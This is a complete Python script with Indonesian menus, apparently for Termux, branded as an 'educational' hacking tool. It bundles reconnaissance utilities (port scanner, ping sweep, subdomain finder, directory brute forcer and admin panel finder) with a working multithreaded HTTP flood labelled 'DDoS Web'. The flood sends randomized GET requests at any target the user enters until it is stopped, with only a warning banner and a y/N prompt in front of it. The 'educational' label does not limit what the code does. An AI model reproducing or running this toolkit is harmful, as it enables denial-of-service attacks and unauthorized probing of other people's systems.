#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import random
import threading
import subprocess
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from datetime import datetime

# Warna untuk Termux (ANSI escape codes)
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

class Back:
    RED = '\033[41m'
    GREEN = '\033[42m'
    YELLOW = '\033[43m'
    BLUE = '\033[44m'
    RESET = '\033[0m'

def clear_screen():
    """Membersihkan layar terminal"""
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    """Menampilkan banner tools"""
    clear_screen()
    banner = f"""
{Colors.RED}
 ██░ ██  ▄▄▄       ███▄    █   ▄████  ███▄ ▄███▓ ▄▄▄       ███▄    █ 
▓██░ ██▒▒████▄     ██ ▀█   █  ██▒ ▀█▒▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ 
▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒
░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░ ░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░
 ░  ░░ ░  ░   ▒      ░   ░ ░ ░ ░   ░ ░      ░     ░   ▒      ░   ░ ░ 
 ░  ░  ░      ░  ░         ░       ░        ░         ░  ░         ░ 
{Colors.RESET}
{Colors.YELLOW}╔══════════════════════════════════════════════════════════╗
║{Colors.CYAN}           PYTHON HACKING TOOL v3.0 - EDUCATIONAL       {Colors.YELLOW}║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)

def print_menu():
    """Menampilkan menu utama"""
    menu = f"""
{Colors.GREEN}╔══════════════════════════════════════════════════════════╗
║{Colors.WHITE}                     MENU UTAMA                    {Colors.GREEN}║
╠══════════════════════════════════════════════════════════╣
║ {Colors.YELLOW}1.{Colors.WHITE} Information Gathering                          {Colors.GREEN}║
║ {Colors.YELLOW}2.{Colors.WHITE} Port Scanner                                   {Colors.GREEN}║
║ {Colors.YELLOW}3.{Colors.WHITE} Ping Sweep                                     {Colors.GREEN}║
║ {Colors.YELLOW}4.{Colors.WHITE} Directory Brute Forcer                         {Colors.GREEN}║
║ {Colors.YELLOW}5.{Colors.WHITE} Website Information                            {Colors.GREEN}║
║ {Colors.YELLOW}6.{Colors.WHITE} Admin Panel Finder                             {Colors.GREEN}║
║ {Colors.YELLOW}7.{Colors.WHITE} DDoS Web (EDUCATIONAL ONLY)                   {Colors.GREEN}║
║ {Colors.YELLOW}8.{Colors.WHITE} About                                         {Colors.GREEN}║
║ {Colors.YELLOW}9.{Colors.WHITE} Exit                                          {Colors.GREEN}║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(menu)

def information_gathering_menu():
    """Menu Information Gathering"""
    while True:
        clear_screen()
        print(f"{Colors.GREEN}╔══════════════════════════════════════════════════════════╗")
        print(f"║{Colors.WHITE}               INFORMATION GATHERING TOOLS           {Colors.GREEN}║")
        print(f"╠══════════════════════════════════════════════════════════╣")
        print(f"║ {Colors.YELLOW}1.{Colors.WHITE} WHOIS Lookup                              {Colors.GREEN}║")
        print(f"║ {Colors.YELLOW}2.{Colors.WHITE} DNS Lookup                                {Colors.GREEN}║")
        print(f"║ {Colors.YELLOW}3.{Colors.WHITE} IP Geolocation                            {Colors.GREEN}║")
        print(f"║ {Colors.YELLOW}4.{Colors.WHITE} Subdomain Finder                         {Colors.GREEN}║")
        print(f"║ {Colors.YELLOW}5.{Colors.WHITE} Kembali ke Menu Utama                    {Colors.GREEN}║")
        print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
        
        choice = input(f"\n{Colors.YELLOW}[?] Pilih opsi (1-5): {Colors.RESET}")
        
        if choice == '1':
            whois_lookup()
        elif choice == '2':
            dns_lookup()
        elif choice == '3':
            ip_geolocation()
        elif choice == '4':
            subdomain_finder()
        elif choice == '5':
            return
        else:
            print(f"{Colors.RED}[!] Pilihan tidak valid{Colors.RESET}")
            time.sleep(1)

def whois_lookup():
    """WHOIS Lookup Tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                      WHOIS LOOKUP                   {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    domain = input(f"\n{Colors.YELLOW}[?] Masukkan domain (contoh: example.com): {Colors.RESET}")
    
    try:
        print(f"\n{Colors.GREEN}[*] Melakukan WHOIS lookup untuk {domain}...{Colors.RESET}")
        result = subprocess.run(['whois', domain], capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\n{Colors.CYAN}=== HASIL WHOIS ==={Colors.RESET}\n")
            print(result.stdout)
        else:
            print(f"{Colors.RED}[!] Gagal melakukan WHOIS lookup{Colors.RESET}")
            print(result.stderr)
            
    except FileNotFoundError:
        print(f"{Colors.RED}[!] WHOIS tool tidak ditemukan. Pastikan sudah terinstall.{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Di Termux, jalankan: pkg install whois{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk melanjutkan...{Colors.RESET}")

def dns_lookup():
    """DNS Lookup Tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                       DNS LOOKUP                    {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    domain = input(f"\n{Colors.YELLOW}[?] Masukkan domain (contoh: example.com): {Colors.RESET}")
    
    try:
        print(f"\n{Colors.GREEN}[*] Melakukan DNS lookup untuk {domain}...{Colors.RESET}")
        
        # A Record
        print(f"\n{Colors.CYAN}=== A RECORD ==={Colors.RESET}")
        a_record = socket.gethostbyname_ex(domain)
        for ip in a_record[2]:
            print(f"{Colors.WHITE}{ip}{Colors.RESET}")
        
        # MX Record
        print(f"\n{Colors.CYAN}=== MX RECORD ==={Colors.RESET}")
        mx_records = subprocess.run(['nslookup', '-query=mx', domain], capture_output=True, text=True)
        print(mx_records.stdout)
        
        # NS Record
        print(f"\n{Colors.CYAN}=== NS RECORD ==={Colors.RESET}")
        ns_records = subprocess.run(['nslookup', '-query=ns', domain], capture_output=True, text=True)
        print(ns_records.stdout)
        
        # TXT Record
        print(f"\n{Colors.CYAN}=== TXT RECORD ==={Colors.RESET}")
        txt_records = subprocess.run(['nslookup', '-query=txt', domain], capture_output=True, text=True)
        print(txt_records.stdout)
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk melanjutkan...{Colors.RESET}")

def ip_geolocation():
    """IP Geolocation Tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                     IP GEOLOCATION                 {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    ip = input(f"\n{Colors.YELLOW}[?] Masukkan IP address: {Colors.RESET}")
    
    try:
        print(f"\n{Colors.GREEN}[*] Mendapatkan informasi geolocation untuk {ip}...{Colors.RESET}")
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        
        if data['status'] == 'success':
            print(f"\n{Colors.CYAN}=== INFORMASI GEOIP ==={Colors.RESET}")
            print(f"{Colors.WHITE}IP: {data['query']}")
            print(f"Negara: {data['country']} ({data['countryCode']})")
            print(f"Region: {data['regionName']} ({data['region']})")
            print(f"Kota: {data['city']}")
            print(f"ZIP: {data['zip']}")
            print(f"Lat/Lon: {data['lat']}, {data['lon']}")
            print(f"Zona Waktu: {data['timezone']}")
            print(f"ISP: {data['isp']}")
            print(f"Organisasi: {data['org']}")
            print(f"AS: {data['as']}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Gagal mendapatkan informasi geolocation{Colors.RESET}")
            
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk melanjutkan...{Colors.RESET}")

def subdomain_finder():
    """Subdomain Finder Tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                    SUBDOMAIN FINDER                 {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    domain = input(f"\n{Colors.YELLOW}[?] Masukkan domain (contoh: example.com): {Colors.RESET}")
    wordlist = input(f"{Colors.YELLOW}[?] Path ke wordlist (kosongkan untuk default): {Colors.RESET}")
    
    if not wordlist:
        # Default wordlist
        subdomains = [
            'www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'ns1', 'ns2',
            'blog', 'dev', 'test', 'admin', 'secure', 'portal', 'cpanel',
            'whm', 'webdisk', 'ns', 'dns', 'm', 'mobile', 'api', 'vpn'
        ]
    else:
        try:
            with open(wordlist, 'r') as f:
                subdomains = f.read().splitlines()
        except:
            print(f"{Colors.RED}[!] Gagal membaca wordlist, menggunakan default{Colors.RESET}")
            subdomains = ['www', 'mail', 'ftp', 'admin']
    
    print(f"\n{Colors.GREEN}[*] Mencari subdomain untuk {domain}...{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Menggunakan {len(subdomains)} subdomain untuk di-test{Colors.RESET}\n")
    
    found = []
    for sub in subdomains:
        target = f"http://{sub}.{domain}"
        try:
            requests.get(target, timeout=5)
            print(f"{Colors.GREEN}[+] Ditemukan: {target}{Colors.RESET}")
            found.append(target)
        except:
            print(f"{Colors.RED}[-] Tidak ditemukan: {target}{Colors.RESET}", end='\r')
    
    print(f"\n\n{Colors.CYAN}=== HASIL PENEMUAN ==={Colors.RESET}")
    for sub in found:
        print(f"{Colors.WHITE}{sub}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk melanjutkan...{Colors.RESET}")

def port_scanner():
    """Port Scanner Tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                      PORT SCANNER                    {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    target = input(f"\n{Colors.YELLOW}[?] Masukkan target (IP/Domain): {Colors.RESET}")
    start_port = input(f"{Colors.YELLOW}[?] Port awal (default 1): {Colors.RESET}") or 1
    end_port = input(f"{Colors.YELLOW}[?] Port akhir (default 1024): {Colors.RESET}") or 1024
    
    try:
        start_port = int(start_port)
        end_port = int(end_port)
        target_ip = socket.gethostbyname(target)
    except:
        print(f"{Colors.RED}[!] Input tidak valid{Colors.RESET}")
        time.sleep(1)
        return
    
    print(f"\n{Colors.GREEN}[*] Memulai scan port {target_ip} dari port {start_port} ke {end_port}{Colors.RESET}")
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                print(f"{Colors.GREEN}[+] Port {port} terbuka ({service}){Colors.RESET}")
            sock.close()
        except:
            pass
    
    threads = []
    for port in range(start_port, end_port + 1):
        thread = threading.Thread(target=scan_port, args=(port,))
        threads.append(thread)
        thread.start()
        
        # Limit number of concurrent threads
        if len(threads) >= 100:
            for t in threads:
                t.join()
            threads = []
    
    for t in threads:
        t.join()
    
    print(f"\n{Colors.CYAN}[*] Scan selesai{Colors.RESET}")
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk melanjutkan...{Colors.RESET}")

def ping_sweep():
    """Ping Sweep Tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                      PING SWEEP                     {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    network = input(f"\n{Colors.YELLOW}[?] Masukkan network (contoh: 192.168.1.0/24): {Colors.RESET}")
    
    try:
        # Simple implementation for /24 network
        if '/24' in network:
            base_ip = network.split('/')[0]
            ip_parts = base_ip.split('.')
            network_prefix = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}."
            
            print(f"\n{Colors.GREEN}[*] Memulai ping sweep untuk {network_prefix}1-254{Colors.RESET}")
            
            active_hosts = []
            
            def ping_host(host):
                ip = f"{network_prefix}{host}"
                try:
                    subprocess.check_output(['ping', '-c', '1', '-W', '1', ip], stderr=subprocess.STDOUT)
                    print(f"{Colors.GREEN}[+] Host aktif: {ip}{Colors.RESET}")
                    active_hosts.append(ip)
                except:
                    print(f"{Colors.RED}[-] Testing: {ip}{Colors.RESET}", end='\r')
            
            threads = []
            for host in range(1, 255):
                thread = threading.Thread(target=ping_host, args=(host,))
                threads.append(thread)
                thread.start()
                
                # Limit concurrent threads
                if len(threads) >= 50:
                    for t in threads:
                        t.join()
                    threads = []
            
            for t in threads:
                t.join()
            
            print(f"\n\n{Colors.CYAN}=== HASIL PING SWEEP ==={Colors.RESET}")
            print(f"{Colors.WHITE}Total host aktif: {len(active_hosts)}{Colors.RESET}")
            for host in active_hosts:
                print(host)
        else:
            print(f"{Colors.RED}[!] Hanya mendukung /24 network saat ini{Colors.RESET}")
            
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk melanjutkan...{Colors.RESET}")

def directory_brute_forcer():
    """Directory Brute Forcer Tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                 DIRECTORY BRUTE FORCER              {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    url = input(f"\n{Colors.YELLOW}[?] Masukkan URL target (contoh: http://example.com): {Colors.RESET}")
    wordlist = input(f"{Colors.YELLOW}[?] Path ke wordlist (kosongkan untuk default): {Colors.RESET}")
    
    if not wordlist:
        # Default wordlist
        directories = [
            'admin', 'login', 'wp-admin', 'wp-login', 'administrator',
            'images', 'css', 'js', 'assets', 'backup', 'backups',
            'cgi-bin', 'tmp', 'temp', 'test', 'testing', 'secret',
            'private', 'secure', 'uploads', 'downloads', 'old',
            'archive', 'phpmyadmin', 'mysql', 'db', 'database'
        ]
    else:
        try:
            with open(wordlist, 'r') as f:
                directories = f.read().splitlines()
        except:
            print(f"{Colors.RED}[!] Gagal membaca wordlist, menggunakan default{Colors.RESET}")
            directories = ['admin', 'login', 'wp-admin']
    
    print(f"\n{Colors.GREEN}[*] Memulai brute force directory untuk {url}...{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Menggunakan {len(directories)} directory untuk di-test{Colors.RESET}\n")
    
    found = []
    for directory in directories:
        target = f"{url}/{directory}"
        try:
            response = requests.get(target, timeout=5)
            if response.status_code == 200:
                print(f"{Colors.GREEN}[+] Ditemukan: {target} (200 OK){Colors.RESET}")
                found.append(target)
            elif response.status_code == 403:
                print(f"{Colors.YELLOW}[+] Ditemukan tapi terlarang: {target} (403 Forbidden){Colors.RESET}")
                found.append(target)
            else:
                print(f"{Colors.RED}[-] Tidak ditemukan: {target}{Colors.RESET}", end='\r')
        except:
            print(f"{Colors.RED}[-] Error mengakses: {target}{Colors.RESET}", end='\r')
    
    print(f"\n\n{Colors.CYAN}=== HASIL PENEMUAN ==={Colors.RESET}")
    for dir in found:
        print(f"{Colors.WHITE}{dir}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk melanjutkan...{Colors.RESET}")

def website_info():
    """Website Information Tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                    WEBSITE INFORMATION              {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    url = input(f"\n{Colors.YELLOW}[?] Masukkan URL website (contoh: http://example.com): {Colors.RESET}")
    
    try:
        print(f"\n{Colors.GREEN}[*] Mengumpulkan informasi tentang {url}...{Colors.RESET}")
        
        # Get headers
        response = requests.get(url)
        headers = response.headers
        
        # Get server info
        server = headers.get('Server', 'Tidak diketahui')
        
        # Get technologies
        tech = []
        if 'X-Powered-By' in headers:
            tech.append(headers['X-Powered-By'])
        
        # Get cookies
        cookies = response.cookies
        
        # Get page title
        soup = BeautifulSoup(response.text, 'html.parser')
        title = soup.title.string if soup.title else "Tidak ditemukan"
        
        # Get forms
        forms = soup.find_all('form')
        
        # Get links
        links = [a.get('href') for a in soup.find_all('a', href=True)]
        
        print(f"\n{Colors.CYAN}=== INFORMASI DASAR ==={Colors.RESET}")
        print(f"{Colors.WHITE}URL: {url}")
        print(f"Status Code: {response.status_code}")
        print(f"Server: {server}")
        print(f"Judul Halaman: {title}")
        
        print(f"\n{Colors.CYAN}=== TEKNOLOGI ==={Colors.RESET}")
        if tech:
            for t in tech:
                print(t)
        else:
            print("Tidak terdeteksi")
            
        print(f"\n{Colors.CYAN}=== COOKIES ==={Colors.RESET}")
        if cookies:
            for cookie in cookies:
                print(f"{cookie.name} = {cookie.value}")
        else:
            print("Tidak ada cookies")
            
        print(f"\n{Colors.CYAN}=== FORMULIR ==={Colors.RESET}")
        if forms:
            for i, form in enumerate(forms, 1):
                print(f"\nForm #{i}:")
                print(f"Aksi: {form.get('action', 'Tidak diketahui')}")
                print(f"Metode: {form.get('method', 'GET')}")
                inputs = form.find_all('input')
                for inp in inputs:
                    print(f"Input: name='{inp.get('name', '')}' type='{inp.get('type', 'text')}'")
        else:
            print("Tidak ditemukan formulir")
            
        print(f"\n{Colors.CYAN}=== LINK EKSTERNAL ==={Colors.RESET}")
        external_links = [link for link in links if link.startswith('http') and url not in link]
        for link in external_links[:10]:  # Show first 10 external links
            print(link)
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk melanjutkan...{Colors.RESET}")

def admin_panel_finder():
    """Admin Panel Finder Tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                    ADMIN PANEL FINDER               {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    url = input(f"\n{Colors.YELLOW}[?] Masukkan URL target (contoh: http://example.com): {Colors.RESET}")
    
    # Common admin panel paths
    admin_paths = [
        'admin', 'wp-admin', 'administrator', 'login', 'panel', 
        'cpanel', 'admin.php', 'admin/login', 'admin_area',
        'user', 'manager', 'webadmin', 'admincp', 'controlpanel',
        'admincontrol', 'admin_login', 'adm', 'account', 'admin1',
        'admin2', 'admin3', 'admin4', 'admin5', 'moderator',
        'secret', 'secure', 'hidden', 'backend', 'cp'
    ]
    
    print(f"\n{Colors.GREEN}[*] Mencari admin panel untuk {url}...{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Menguji {len(admin_paths)} path umum{Colors.RESET}\n")
    
    found = []
    for path in admin_paths:
        target = f"{url}/{path}"
        try:
            response = requests.get(target, timeout=5)
            if response.status_code == 200:
                print(f"{Colors.GREEN}[+] Ditemukan: {target} (200 OK){Colors.RESET}")
                found.append(target)
            elif response.status_code == 403:
                print(f"{Colors.YELLOW}[+] Ditemukan tapi terlarang: {target} (403 Forbidden){Colors.RESET}")
                found.append(target)
            else:
                print(f"{Colors.RED}[-] Tidak ditemukan: {target}{Colors.RESET}", end='\r')
        except:
            print(f"{Colors.RED}[-] Error mengakses: {target}{Colors.RESET}", end='\r')
    
    print(f"\n\n{Colors.CYAN}=== HASIL PENEMUAN ==={Colors.RESET}")
    for panel in found:
        print(f"{Colors.WHITE}{panel}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk melanjutkan...{Colors.RESET}")

def ddos_web():
    """Improved DDoS Web for Termux"""
    clear_screen()
    print(f"{Colors.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}{Back.RED}         PERINGATAN: HANYA UNTUK EDUKASI          {Back.RESET}{Colors.RED}║")
    print(f"╠══════════════════════════════════════════════════════════╣")
    print(f"║ {Colors.YELLOW}1.{Colors.WHITE} Anda HARUS memiliki izin tertulis dari pemilik  {Colors.RED}║")
    print(f"║ {Colors.YELLOW}2.{Colors.WHITE} DDoS adalah aktivitas ILEGAL di banyak negara   {Colors.RED}║")
    print(f"║ {Colors.YELLOW}3.{Colors.WHITE} Ini hanya untuk pengujian sistem ANDA SENDIRI   {Colors.RED}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    confirm = input(f"\n{Colors.YELLOW}[?] Apakah Anda memahami dan setuju (y/N)? {Colors.RESET}").lower()
    if confirm != 'y':
        return
    
    target = input(f"{Colors.YELLOW}[?] Masukkan target URL (contoh: example.com): {Colors.RESET}").strip()
    port = int(input(f"{Colors.YELLOW}[?] Masukkan port (default 80): {Colors.RESET}") or 80)
    threads = int(input(f"{Colors.YELLOW}[?] Jumlah thread (default 30): {Colors.RESET}") or 30)
    
    # Validasi input
    if not target:
        print(f"{Colors.RED}[!] Target tidak valid{Colors.RESET}")
        return
    
    try:
        # Resolve IP (handle both domain and IP input)
        try:
            ip = socket.gethostbyname(target)
        except:
            ip = target if target.replace('.','').isdigit() else None
        
        if not ip:
            print(f"{Colors.RED}[!] Gagal resolve IP{Colors.RESET}")
            return
            
        print(f"\n{Colors.RED}[!] MEMULAI SERANGAN EDUKASI KE {ip}:{port}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Gunakan Ctrl+C untuk menghentikan{Colors.RESET}")
        
        attack_num = 0
        running = True
        
        # Header HTTP yang lebih lengkap
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Linux; Android 10; SM-A205U)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X)'
        ]
        
        def attack():
            nonlocal attack_num
            while running:
                try:
                    # Buat socket baru setiap request
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)  # Timeout 3 detik
                    
                    # Connect ke target
                    s.connect((ip, port))
                    
                    # Bangun paket HTTP
                    user_agent = random.choice(user_agents)
                    request = (
                        f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                    )
                    
                    # Kirim paket
                    s.send(request.encode())
                    attack_num += 1
                    print(f"{Colors.RED}[+] Paket dikirim: {attack_num}{Colors.RESET}", end='\r')
                    s.close()
                    
                    # Random delay antara 0.1-0.5 detik
                    time.sleep(random.uniform(0.1, 0.5))
                    
                except Exception as e:
                    try:
                        s.close()
                    except:
                        pass
                    continue
        
        # Start threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        # Tunggu sampai diinterrupt
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            running = False
            print(f"\n{Colors.YELLOW}[!] Menghentikan serangan...{Colors.RESET}")
            
            # Tunggu semua thread selesai
            for t in thread_list:
                t.join()
            
            print(f"{Colors.CYAN}[*] Total paket dikirim: {attack_num}{Colors.RESET}")
    
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk kembali ke menu...{Colors.RESET}")

def about():
    """About the tool"""
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                         ABOUT                       {Colors.CYAN}║")
    print(f"╠══════════════════════════════════════════════════════════╣")
    print(f"║ {Colors.YELLOW}Nama Tool:{Colors.WHITE} Python Hacking Tool v3.0             {Colors.CYAN}║")
    print(f"║ {Colors.YELLOW}Tujuan:{Colors.WHITE} Edukasi dan pengujian keamanan          {Colors.CYAN}║")
    print(f"║ {Colors.YELLOW}Peringatan:{Colors.WHITE} Hanya gunakan untuk tujuan legal    {Colors.CYAN}║")
    print(f"║ {Colors.YELLOW}Lisensi:{Colors.WHITE} MIT License                           {Colors.CYAN}║")
    print(f"║ {Colors.YELLOW}Pembuat:{Colors.WHITE} Anonymous                             {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk kembali ke menu...{Colors.RESET}")

def main():
    """Fungsi utama"""
    try:
        # Cek dependensi
        try:
            subprocess.run(['curl', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['ping', '-c', '1', '127.0.0.1'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Pastikan curl dan ping terinstall di Termux{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Jalankan: pkg install curl iputils-ping{Colors.RESET}")
            sys.exit(1)
            
        while True:
            print_banner()
            print_menu()
            choice = input(f"{Colors.YELLOW}[?] Pilih opsi (1-9): {Colors.RESET}")

            if choice == '1':
                information_gathering_menu()
            elif choice == '2':
                port_scanner()
            elif choice == '3':
                ping_sweep()
            elif choice == '4':
                directory_brute_forcer()
            elif choice == '5':
                website_info()
            elif choice == '6':
                admin_panel_finder()
            elif choice == '7':
                ddos_web()
            elif choice == '8':
                about()
            elif choice == '9':
                print(f"\n{Colors.GREEN}[+] Keluar dari program...{Colors.RESET}")
                time.sleep(1)
                sys.exit(0)
            else:
                print(f"\n{Colors.RED}[!] Pilihan tidak valid{Colors.RESET}")
                time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program dihentikan oleh pengguna{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
